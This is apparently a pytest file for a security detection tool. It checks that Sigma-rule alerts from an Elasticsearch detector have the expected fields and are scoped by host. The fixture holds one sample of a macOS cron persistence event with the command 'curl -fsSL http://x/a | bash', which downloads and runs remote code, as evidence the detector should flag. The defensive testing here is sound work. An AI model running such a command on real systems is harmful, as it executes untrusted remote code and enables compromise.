# SPDX-License-Identifier: GPL-3.0-or-later
"""ESDetector emits the same alert shape as run_rules, and scopes by host."""
import pathlib

from raptorscope.detect.es_detector import ESDetector

RULES = str(pathlib.Path(__file__).resolve().parents[2] / "detections" / "sigma")

HIT = {
    "_id": "7",
    "_source": {
        "event": {"dataset": "macos.persistence"},
        "file": {"path": "/Users/Shared/.x/run"},
        "process": {"command_line": "curl -fsSL http://x/a | bash"},
        "raptorscope": {"persistence": {"type": "cron"}},
    },
}


class FakeES:
    def __init__(self, hit):
        self.hit = hit
        self.queries = []

    def search(self, index, size, query):
        self.queries.append(query)
        return {"hits": {"hits": [self.hit]}}


def test_run_emits_alert_shape_per_rule():
    es = FakeES(HIT)
    det = ESDetector(es, rules_dir=RULES)
    alerts = det.run(host="mac-victim")
    assert alerts, "expected at least one alert"
    a = alerts[0]
    assert {"rule_id", "title", "level", "dataset", "doc_id", "evidence"} <= a.keys()
    assert a["doc_id"] == "7"
    assert a["dataset"] == "macos.persistence"
    assert isinstance(a["evidence"], dict)


def test_run_scopes_by_host():
    es = FakeES(HIT)
    ESDetector(es, rules_dir=RULES).run(host="mac-victim")
    # every query filters on host.name
    for q in es.queries:
        assert {"term": {"host.name": "mac-victim"}} in q["bool"]["filter"]
